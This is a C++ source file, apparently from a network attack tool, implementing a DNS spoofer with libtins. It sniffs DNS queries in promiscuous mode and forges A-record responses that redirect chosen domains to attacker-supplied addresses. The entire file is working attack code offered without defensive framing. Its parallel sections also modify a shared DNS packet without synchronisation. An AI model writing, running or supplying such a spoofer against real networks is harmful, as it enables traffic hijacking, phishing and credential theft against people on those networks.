#include "dns_spoofer.h"
#include <tins/tins.h>
#include <iostream>
#include <thread>
#include <string>

using std::cout;
using std::endl;
using namespace Tins;

DNS_Spoofer::DNS_Spoofer()
{
    start("eno1");
}

void DNS_Spoofer::start(std::string interface) {
    //detach a thread then return to gui
    std::thread(&DNS_Spoofer::setup, this,  interface).detach();
}

void DNS_Spoofer::add_target(std::string target, std::string redirect) {
    Target t;
    t.target = target;
    t.redirect = redirect;
    targets.push_back(t);
}

void DNS_Spoofer::reset() {
    targets.clear();
}


void DNS_Spoofer::setup(std::string interface) {
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_immediate_mode(true);
    config.set_filter("udp and dst port 53");
    Sniffer sniffer(interface, config);
    sender.default_interface(interface);
    sniffer.sniff_loop(make_sniffer_handler(this, &DNS_Spoofer::handle));
}

bool DNS_Spoofer::handle(PDU& pdu) {
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

    // Is it a DNS query?
    if (dns.type() == DNS::QUERY) {
        // Let's see if there's any query for an "A" record.

        #pragma omp parallel
        {
            #pragma omp single
            {
                for (const auto& query : dns.queries()) {
                    if (query.query_type() == DNS::A) {

                        #pragma omp task
                        {
                            for(auto const& t: targets) {
                                if (query.dname() == t.target) {
                                    // Here's one! Let's add an answer.
                                    dns.add_answer(
                                        DNS::resource(
                                            query.dname(),
                                            t.redirect,
                                            DNS::A,
                                            query.query_class(),
                                            // 777 is just a random TTL
                                            777
                                        )
                                    );
                                    break;
                                }
                            }
                        }

                    }
                }
                // Have we added some answers?
                if (dns.answers_count() > 0) {
                    // It's a response now
                    dns.type(DNS::RESPONSE);
                    // Recursion is available(just in case)
                    dns.recursion_available(1);
                    // Build our packet
                    auto pkt = EthernetII(eth.src_addr(), eth.dst_addr()) /
                               IP(ip.src_addr(), ip.dst_addr()) /
                               UDP(udp.sport(), udp.dport()) /
                               dns;
                    // Send it!
                    sender.send(pkt);
                }
            }
        }
    }
    return true;
}
